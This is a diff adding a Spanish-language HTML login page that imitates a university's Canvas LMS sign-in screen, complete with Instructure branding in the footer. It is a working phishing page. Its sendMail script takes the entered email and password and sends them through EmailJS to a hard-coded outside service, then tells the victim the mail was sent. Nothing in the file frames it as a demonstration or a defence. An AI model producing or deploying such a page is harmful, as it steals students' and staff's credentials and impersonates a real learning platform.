@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #1D4E80; /* Color azul de fondo */
+            display: flex;
+            justify-content: center;
+            padding-top: 50px; /* Ajusta el margen superior */
+            color: white;
+        }
+
+        .container {
+            background-color: #1D4E80;
+            padding: 20px;
+            width: 30%; /* Reducir ancho al 80% */
+            max-width: 340px; /* Limitar a un máximo de 400px */
+        }
+
+        img {
+            width: 160px; /* Tamaño del logo */
+            margin-bottom: 20px;
+            display: block;
+            margin-left: 0; /* Alinear a la izquierda */
+        }
+
+        form {
+            text-align: left;
+        }
+
+        label {
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%; /* Hacer más pequeños los inputs */
+            padding: 10px;
+            margin: 5px 0 15px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .form-group {
+            margin: 10px 0;
+        }
+
+        input[type="checkbox"] {
+            margin-right: 0px;
+            transform: scale(1); /* Tamaño del checkbox */
+        }
+
+        .checkbox-container {
+            display: flex;
+            font-size: 13px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .forgot-password {
+            margin-left: 5px;
+            font-size: 15px;
+            color: white;
+            margin-top: 5px;
+        }
+
+        .forgot-password a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            width: 45%;
+            background-color: transparent;
+            color: white;
+            padding: 10px;
+            border: 2px solid white;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            text-size-adjust: 5px;
+            margin-left: 0px;
+        }
+
+        .btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        footer {
+            font-weight: bold;
+            margin-top: 30px;
+            font-size: 10px; 
+            text-align: center;
+        }
+
+        footer a {
+            color: #ccc;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-logo {
+            margin-top: 10px;
+            display: flex;
+            justify-content: center; /* Centra horizontalmente la imagen */
+            align-items: center;
+        }
+
+
+        footer .footer-links .footer-links2 .footer-links3 a {
+            margin-right: 5px; /* Reduce el espacio entre los enlaces */
+        }
+
+        footer .footer-links .footer-links2 .footer-links3 a:last-child {
+            margin-right: 0; /* El último enlace no necesita margen a la derecha */
+        }
+
+
+        .footer-links {
+            margin-top: 70px;
+        }
+
+        .footer-links2 {
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .footer-links3 {
+            margin-top: 0px;
+            padding: 0px;
+        }
+
+    </style>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("SEEIe9E18wpJz3LIx");
+        })();
+    </script>
+</head>
+<body>
+
+    <div class="container">
+        <img src="logo.png" alt="Logo Universidad"> <!-- Debes reemplazar con la URL del logo correcto -->
+        <form onsubmit="sendMail(event)">
+            <div class="form-group">
+                <label for="email">Correo electrónico</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="bottom-row">
+                <div>
+                    <div class="checkbox-container">
+                        <label>
+                            <input type="checkbox" id="stayLoggedIn" name="stayLoggedIn">
+                            Permanezca conectado
+                        </label>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#">¿Olvidó la contraseña?</a>
+                    </div>
+                </div>
+                <button type="submit" class="btn">Iniciar sesión</button>
+            </div>
+        </form>
+
+        <footer>
+            <div class="footer-links">
+                <a href="#">Ayuda</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Aviso de cookie</a>
+            </div>
+            <div class="footer-links2">
+                <a href="#">Política de uso aceptable</a>
+                <a href="#">Facebook</a>
+                <a href="#">X.com</a>
+            </div>
+            <div class="footer-logo">
+                <img src="footer-logo.png" alt="Instructure"> <!-- Logo de Instructure -->
+            </div>
+            <label>
+                Introducción a la plataforma de aprendizaje Instructure:                        
+            </label>
+            <div class="footer-links3">
+                <a href="#">Canvas LMS</a> 
+                <a href="#">Canvas Studio</a> 
+                <a href="#">Canvas Catalog</a> 
+                <a href="#">Impact</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function sendMail(event) {
+            event.preventDefault(); // Evita el envío por defecto del formulario
+            let parms = {
+                email: document.getElementById("email").value,
+                password: document.getElementById("password").value,
+            };
+
+            emailjs.send("service_qx5ovuq", "template_7fxtvfo", parms)
+            .then(function(response) {
+                alert("Correo enviado con éxito!");
+            }, function(error) {
+                alert("Hubo un error al enviar el correo: " + JSON.stringify(error));
+            });
+        }
+    </script>
+</body>
+</html>
